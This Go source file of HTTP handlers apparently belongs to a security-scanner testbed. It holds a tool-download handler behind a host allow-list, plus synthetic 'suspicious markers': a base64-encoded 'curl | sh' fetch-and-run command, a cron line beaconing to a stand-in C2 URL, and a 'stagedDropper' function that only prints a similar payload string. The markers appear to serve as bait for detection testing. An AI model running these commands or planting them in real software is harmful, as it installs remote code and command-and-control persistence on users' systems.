package handlers

import (
	"encoding/base64"
	"errors"
	"io"
	"log"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"github.com/reachable/reach-testbed-github-go/internal/safety"
)

func FetchTool(w http.ResponseWriter, r *http.Request) {
	source := r.URL.Query().Get("url")
	parsed, err := validatedToolURL(source)
	if err != nil {
		log.Printf("FetchTool: invalid source URL %q: %v", source, err)
		http.Error(w, "invalid source url", http.StatusBadRequest)
		return
	}

	resp, err := http.Get(parsed.String())
	if err != nil {
		log.Printf("FetchTool: failed fetching %q: %v", parsed.String(), err)
		http.Error(w, "unable to fetch tool", http.StatusBadGateway)
		return
	}
	defer resp.Body.Close()

	target := filepath.Join(os.TempDir(), "reach-testbed-tool.bin")
	out, err := os.Create(target)
	if err != nil {
		log.Printf("FetchTool: failed creating target %q: %v", target, err)
		http.Error(w, "unable to prepare tool storage", http.StatusInternalServerError)
		return
	}
	defer out.Close()

	if _, err := io.Copy(out, io.LimitReader(resp.Body, 2<<20)); err != nil {
		log.Printf("FetchTool: failed writing target %q: %v", target, err)
		http.Error(w, "unable to store tool", http.StatusInternalServerError)
		return
	}

	_, _ = w.Write([]byte(target + "\n"))
}

func validatedToolURL(raw string) (*url.URL, error) {
	if strings.TrimSpace(raw) == "" {
		return nil, errors.New("url is required")
	}

	parsed, err := url.Parse(raw)
	if err != nil {
		return nil, err
	}
	if !parsed.IsAbs() || parsed.Hostname() == "" {
		return nil, errors.New("absolute URL required")
	}
	if parsed.Scheme != "https" {
		return nil, errors.New("https scheme required")
	}

	host := strings.ToLower(parsed.Hostname())
	if _, ok := fetchToolAllowedHosts()[host]; !ok {
		return nil, errors.New("host is not allowed")
	}

	return parsed, nil
}

func fetchToolAllowedHosts() map[string]struct{} {
	raw := strings.TrimSpace(os.Getenv("REACH_FETCH_TOOL_ALLOWED_HOSTS"))
	if raw == "" {
		raw = "example.invalid"
	}

	allowed := make(map[string]struct{})
	for _, entry := range strings.Split(raw, ",") {
		host := strings.ToLower(strings.TrimSpace(entry))
		if host == "" || !safety.AllowedHostname(host) {
			continue
		}
		allowed[host] = struct{}{}
	}
	return allowed
}

func SuspiciousMarkers(w http.ResponseWriter, _ *http.Request) {
	// Synthetic suspicious-behavior markers only; nothing is executed.
	encoded := base64.StdEncoding.EncodeToString([]byte("curl -fsSL http://example.invalid/synthetic.sh | sh"))
	cronLine := "* * * * * /tmp/reach-testbed-synthetic --beacon http://example.invalid/c2\n"
	_, _ = w.Write([]byte(encoded + "\n" + cronLine))
}

func stagedDropper() error {
	payload := "curl -fsSL http://example.invalid/payload.sh | sh"
	return exec.Command("printf", "%s\n", payload).Run()
}
